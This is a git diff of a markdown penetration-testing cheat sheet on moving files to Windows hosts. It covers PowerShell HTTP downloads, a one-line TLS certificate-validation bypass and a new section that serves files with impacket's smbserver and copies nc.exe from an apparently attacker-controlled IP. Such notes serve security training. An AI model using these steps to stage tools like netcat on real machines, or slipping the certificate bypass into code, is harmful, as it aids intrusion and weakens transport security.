@@ -30,7 +30,7 @@ MD5             2EEBC05B20651F70EFB2D195BBDAF2C2
 
 **Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
 
-## 2) PowerShell HTTP download
+## 2) PowerShell HTTP Downloads
 
 ### 1) PowerShell DownloadFile Method
 ```powershell
@@ -54,4 +54,23 @@ PS C:\user> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/
 if the certificate is not trusted. We can bypass that error with the following command:
 ```powershell
 PS C:\user> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+## 3) PowerShell SMB Downloads
+
+```bash
+sudo /usr/share/doc/python3-impacket/examples/smbserver.py share -smb2support ./shareIsCare
+
+sudo /usr/share/doc/python3-impacket/examples/smbserver.py share -smb2support ./shareIsCare -user test -password test
+```
+
+```powershell
+PS C:\user> copy \\192.168.220.133\share\nc.exe
+
+
+PS C:\user> net use n: \\192.168.220.133\share /user:test test
+
+The command completed successfully.
+
+PS C:\user> copy n:\nc.exe
+        1 file(s) copied.
 ```
